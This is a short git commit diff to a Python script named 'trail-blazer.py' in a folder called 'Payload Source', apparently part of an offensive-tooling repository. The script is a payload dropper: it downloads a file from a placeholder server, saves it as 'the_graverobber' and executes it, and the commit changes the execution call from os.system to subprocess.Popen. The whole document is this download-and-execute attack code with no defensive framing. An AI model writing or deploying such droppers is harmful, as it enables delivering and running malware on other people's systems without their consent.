0d3c326bf7be18e0691b01522332caffc566a90c
rf-peixoto <50427765+rf-peixoto@users.noreply.github.com>
2021-06-01 15:35:17 -0300

    Update trail-blazer.py

--- Payload Source/trail-blazer.py
+++ Payload Source/trail-blazer.py
@@ -1,8 +1,7 @@
+import subprocess
 import requests
-import os
 
 data = requests.get("http://your-server.com/payload_path/file")
 with open("the_graverobber", "wb") as fl:
     fl.write(data.content)
-
-os.system("./the_graverobber")
+subprocess.Popen(args="", executable="the_graverobber")
